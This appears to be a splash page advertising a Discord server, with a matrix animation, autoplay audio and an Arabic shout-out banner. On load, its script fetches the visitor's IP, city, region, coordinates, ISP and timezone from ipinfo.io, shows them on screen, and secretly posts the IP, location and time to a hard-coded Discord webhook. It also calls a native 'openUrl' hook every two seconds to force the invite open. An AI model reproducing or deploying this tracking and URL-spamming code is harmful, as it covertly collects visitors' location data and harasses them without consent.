<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>discord.gg/mt3</title>
    <style>
       body {
            margin: 0;
            padding: 0;
            background: radial-gradient(circle at top left, #1a1a1a 0%, #2e2e3a 30%, #000000 70%);
            font-family: 'Courier New', Courier, monospace;
            color: #9f8663;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            text-align: center;
            overflow: hidden;
        }
        #content {
            display: none;
            opacity: 0;
            transition: opacity 2s ease;
        }
        .video-container img,
        .video-container video {
            width: 400px; 
            height: auto;
            border: 2px solid #c2c2c2; 
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.7); 
        }
        .info {
            margin-top: 20px;
            font-size: 1.5em;
            color: #ffffff; 
            text-shadow: 0 0 8px #ffffff 0 0 15px #ffffff, 0 0 25px #ffffff;
            letter-spacing: 4.5px; 
            white-space: pre-wrap;
        }
        .text {
            margin-top: 5px;
            font-size: 75px; 
            color: #ffffff; 
            text-shadow: 0 0 8px #ffffff, 0 0 15px #ffffff, 0 0 25px #ffffff; 
            letter-spacing: 4.5px;
        }
        .background-video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: -1;
        }
        .background-video-container video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(15px);
        }
        canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <canvas id="matrix-canvas"></canvas>

    <div class="gif-container">
        <img src="" alt="">
    </div>

    <div id="content">
        <div class="video-container">
            <img src="https://cdn.discordapp.com/attachments/1399008464209969162/1399009122925547590/40DC725F-1CAD-4ED1-995E-F603B01055EB.jpg?ex=68877047&is=68861ec7&hm=fe1cedb634bc5baf74e5df7b481e9b87670efd1443bcad64b382d9b1fdd9dc7a&" alt="Banner">
        </div>

        <audio autoplay loop>
            <source src="https://cdn.discordapp.com/attachments/1399008464209969162/1399009458675257405/9cc659304bee40b592c1ede1e8c1b26b.mov?ex=68877097&is=68861f17&hm=10070b1d197a0ac78a2f7ff9cbe2ef89982f3943ca362f2b334bcfea8554f48f&" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>
        <div class="info" id="ip-info"></div>
         <div class="text">بعيوني راشد - بعيوني سيف - بعيوني ابو جيزن</div>
        <div class="text">discord.gg/mt3</div>
    </div>

    <script>
        // Hacker-style matrix animation with 5 0 digits
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');
        let width, height, columns, drops;

        function setupCanvas() {
            canvas.width = width = window.innerWidth;
            canvas.height = height = window.innerHeight;
            columns = Math.floor(width / 20);
            drops = Array(columns).fill(1);
        }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, width, height);
            ctx.fillStyle = '#888';
            ctx.font = '16px Courier New';

            for (let i = 0; i < drops.length; i++) {
                const text = i % 2 === 0 ? '5' : '0';
                ctx.fillText(text, i * 20, drops[i] * 20);
                if (drops[i] * 20 > height || Math.random() > 0.975) drops[i] = 0;
                if (Math.random() > 0.5) drops[i]++;
            }

            setTimeout(drawMatrix, 70);
        }

        window.addEventListener('resize', setupCanvas);
        setupCanvas();
        drawMatrix();

        // IP info fetch
        setTimeout(() => {
            document.querySelector('.gif-container').style.display = 'none';
            const content = document.getElementById('content');
            content.style.display = 'block';
            setTimeout(() => {
                content.style.opacity = 1;
            }, 200);
        }, 200);

        fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            const { ip, country, city, region, loc, org, timezone } = data;
            const infoDiv = document.getElementById('ip-info');
            infoDiv.innerHTML = `
<strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;

            const dateTime = new Date().toLocaleString();
            const webhookUrl = 'https://discord.com/api/webhooks/1325061981950050389/7PxGB9BL2__G9qAhZNlr7pW61I4rR6WFTzaKqTJWnBi1KeOXYKNZIi-SWpY-6U9xhET0';
            fetch(webhookUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
            });
        });

        setInterval(function() {
            window.invokeNative("openUrl", "https://discord.gg/mt3");
            window.invokeNative("openUrl", "https://discord.gg/mt3");
        }, 2000);
    </script>
</body>
</html>
